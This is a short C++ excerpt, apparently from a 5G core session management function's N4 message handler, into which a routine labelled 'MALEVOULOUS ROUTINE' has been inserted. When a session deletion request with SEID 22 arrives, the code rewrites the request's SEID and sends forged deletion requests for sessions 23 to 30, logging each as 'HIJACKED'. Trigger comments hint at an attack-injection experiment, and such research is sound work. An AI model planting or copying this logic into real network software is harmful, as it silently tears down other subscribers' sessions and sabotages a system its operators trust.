    ...
    switch (msg->msg_type) {
      ...
      case N4_SESSION_DELETION_REQUEST:
        if (itti_n4_session_deletion_request* m =
          ...
          //CASE T=30 ; M=9; trigger_i=22
          if (m->seid == 22) {
            //MALEVOULOUS ROUTINE 
            //OLD: int seid_array[10] = {0xb, 0xc, 0xd, 0xe, 0xf, 0x10, 0x11, 0x12, 0x13, 0x14};
            int seid_array[8] = {23, 24, 25, 26, 27, 28, 29, 30};
            z = 0;

            for(z=0; z<8; z++) {
                m->seid = (seid_t) seid_array[z];
                Logger::smf_n4().info("[HIJACKED-30%] (T=30) %d MODIFIED SESSION DELETION REQUEST with seid %d", z, m->seid);
                smf_n4_inst->send_n4_msg(ref(*m)); 
            }
